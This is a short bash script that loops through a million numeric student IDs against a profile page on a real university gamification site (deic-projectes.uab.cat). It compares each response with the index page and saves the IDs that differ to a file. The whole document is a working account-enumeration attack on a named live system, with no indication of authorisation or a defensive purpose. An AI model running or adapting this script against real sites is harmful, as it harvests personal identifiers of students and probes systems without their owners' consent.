touch nius.txt
index=$(curl -L -s http://deic-projectes.uab.cat/gamification/development/index.html)
for niu in {1000000..1999999}
do
	echo -n "Testing $niu... "
	niuIndex=$(curl -L -s http://deic-projectes.uab.cat/gamification/perfil.php?niu=$niu)
	if [ "$index" == "$niuIndex" ]
	then
		echo "Failure"
	else
		echo "Success!"
		echo $niu >> nius.txt
	fi
	sleep 1
done
